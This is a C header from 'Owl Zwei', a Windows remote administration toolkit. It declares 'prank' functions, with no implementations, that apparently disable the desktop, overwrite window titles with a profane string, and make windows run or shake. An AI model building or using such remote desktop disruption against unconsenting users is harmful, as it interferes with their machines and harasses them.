/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#ifndef __OWL_WINDOWPRANKS_H__
#define __OWL_WINDOWPRANKS_H__

#include <windows.h>
#include "misc.h"

#define RUNW_NORMAL	0
#define RUNW_EFFECT	1

extern char *szFUStr;
extern bool bCtrlFU;
extern bool bCtrlMakeWindowsRun;
extern int  nRunWindowsEffect;
extern unsigned int uiRunWindowsDelay;
extern bool bCtrlQuake;
extern unsigned int uiQuakeDelay;

//----------------------------------------------------------
void EnableDesktop( bool enable );
//----------------------------------------------------------
void FuckYou( bool start );
//----------------------------------------------------------
DWORD WINAPI fuckYouProc( LPVOID ptr );
//----------------------------------------------------------
BOOL CALLBACK EnumFU( HWND hWnd , LPARAM lParam );
//----------------------------------------------------------
BOOL CALLBACK EnumChildrenFU( HWND hWnd , LPARAM lParam );
//----------------------------------------------------------
void MakeWindowsRun( bool start );
//----------------------------------------------------------
DWORD WINAPI WRunProc( LPVOID ptr );
//----------------------------------------------------------
//DWORD WINAPI WRunEffectProc( LPVOID ptr );
//----------------------------------------------------------
void Quake( bool start );
//----------------------------------------------------------
DWORD WINAPI quakeProc( LPVOID ptr );
//----------------------------------------------------------
BOOL CALLBACK EnumQuake( HWND hWnd , LPARAM lParam );
//----------------------------------------------------------

#endif
